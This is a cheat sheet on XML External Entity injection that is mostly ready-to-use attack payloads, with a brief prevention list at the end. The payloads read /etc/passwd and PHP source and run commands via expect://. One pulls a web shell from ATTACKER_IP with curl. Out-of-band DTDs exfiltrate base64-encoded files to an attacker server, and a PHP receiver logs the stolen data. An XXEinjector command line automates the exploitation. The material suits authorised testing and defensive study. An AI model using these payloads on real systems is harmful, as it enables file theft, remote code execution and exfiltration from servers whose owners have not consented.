

## Introduction
XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it. This allows attackers to use XML features to perform malicious actions.

### Impact
- **Local File Inclusion (LFI)**: Reading sensitive files (e.g., `/etc/passwd`, configuration files).
- **Remote Code Execution (RCE)**: Executing system commands.
- **SSRF**: Scanning internal ports and accessing restricted internal web pages.
- **Denial of Service (DoS)**: Exhausting server resources.
- XSS

---

## Discovery

### Identifying Potential Entry Points
1.  **XML Input**: Look for web pages that accept XML input.
2.  **Hidden XML Support**: Even if the app sends JSON, try changing `Content-Type` to `application/xml` and converting JSON data to XML.
3.  **File Uploads**: SVG, DOCX, PDF, and other file formats often use XML parsers.

### Testing for XXE
Inject a basic entity definition to see if it gets interpreted.

**Request:**
```xml
<!-- Define a new entity 'company' -->
<!DOCTYPE email [
  <!ENTITY company "Inlane someorg.local">
]>
<root>
  <email>&company;</email>
</root>
```

**Analysis:**
-   **Vulnerable**: The response displays "Inlane someorg.local".
-   **Not Vulnerable**: The response displays `&company;` or nothing.

---

## Exploitation

### 1. Local File Disclosure (Basic XXE)
Read local files by defining an external entity pointing to the file path.

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
  <email>&company;</email>
</root>
```

**Note:** In Java, you might be able to list directories by specifying a directory path instead of a file.

### 2. Reading Source Code (PHP Wrapper)
Use PHP filters to read source code without executing it (base64 encoded).

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <email>&company;</email>
</root>
```

### 3. Remote Code Execution (RCE)
Requires the PHP `expect` module to be installed and enabled.

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
<root>
  <email>&company;</email>
</root>
```

**RCE via Web Shell Upload:**
1.  Write a PHP web shell to a file.
2.  Start a python server: `python3 -m http.server 80`.
3.  Use XXE to fetch the shell and write it to the server (using `curl` or similar if available via `expect` wrapper).

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'http://ATTACKER_IP/shell.php'">
]>
```

### 4. Advanced Exfiltration (CDATA)
Used when the file content contains special characters (like `<, >, &, "`) that break XML structure. Wrap content in `CDATA`.

**Steps:**
1.  Create a malicious DTD (`xxe.dtd`) on your server:
    ```xml
    <!ENTITY joined "%begin;%file;%end;">
    ```
2.  Send the payload:
    ```xml
    <!DOCTYPE email [
      <!ENTITY % begin "<![CDATA[">
      <!ENTITY % file SYSTEM "file:///var/www/html/config.php">
      <!ENTITY % end "]]>">
      <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
      %xxe;
    ]>
    <root>
      <email>&joined;</email>
    </root>
    ```

### 5. Error-Based XXE
If the application displays runtime errors but doesn't show output, use errors to exfiltrate data.

**Malicious DTD (`xxe.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

**Payload:**
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

### 6. Blind XXE (Out-of-Band)
When no output or errors are displayed, use OOB techniques to send data to your server.

**Malicious DTD (`xxe.dtd`):**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://ATTACKER_IP:8000/?content=%file;'>">
```

**Payload:**
```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

**Receiver (PHP):**
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

---

## Tools

### XXEinjector
Automates XXE exploitation.

**Clone:**
```bash
git clone https://github.com/enjoiz/XXEinjector.git
```

**Usage:**
1.  Capture the request in a file (`xxe.req`).
2.  Replace the injection point with `XXEINJECT`.
3.  Run the tool:
    ```bash
    ruby XXEinjector.rb --host=[ATTACKER_IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
    ```

**Common Options:**
-   `--host`: Attacker IP.
-   `--httpport`: Port for the tool's HTTP server.
-   `--file`: Request file.
-   `--path`: File to read on target.
-   `--oob`: OOB method (http, ftp, gopher).
-   `--phpfilter`: Use base64 encoding.

---

## Prevention

1.  **Disable External Entities**: Configure the XML parser to disable DTDs and external entities.
    -   Disable `External XML Entities`.
    -   Disable `Parameter Entity` processing.
    -   Disable `XInclude`.
2.  **Avoid XML**: Use JSON or YAML where possible.
3.  **WAF**: Use a WAF to detect and block XXE payloads (but don't rely solely on it).
4.  **Error Handling**: Disable verbose error messages in production.
